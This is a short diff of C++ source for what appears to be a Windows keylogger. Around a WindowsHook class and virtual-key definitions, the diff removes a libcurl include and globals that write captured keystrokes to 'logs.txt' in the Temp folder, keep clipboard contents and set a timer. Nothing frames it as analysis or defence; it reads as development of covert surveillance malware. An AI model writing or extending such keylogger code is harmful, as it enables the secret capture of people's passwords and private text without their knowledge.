@@ -10,8 +10,6 @@
 #include <iomanip>
 #include <iphlpapi.h>
 
-#include "include/curl/curl.h"
-
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 #pragma comment(lib,"ws2_32.lib") // ws2_32.dll windows' library
 #pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
@@ -64,14 +62,6 @@
 #define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
 #define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)
 
-char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
-DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
-const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
-
-std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
-std::string contentFile = ""; // save everything of what is been writing down
-
-const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes
 
 class WindowsHook
 {
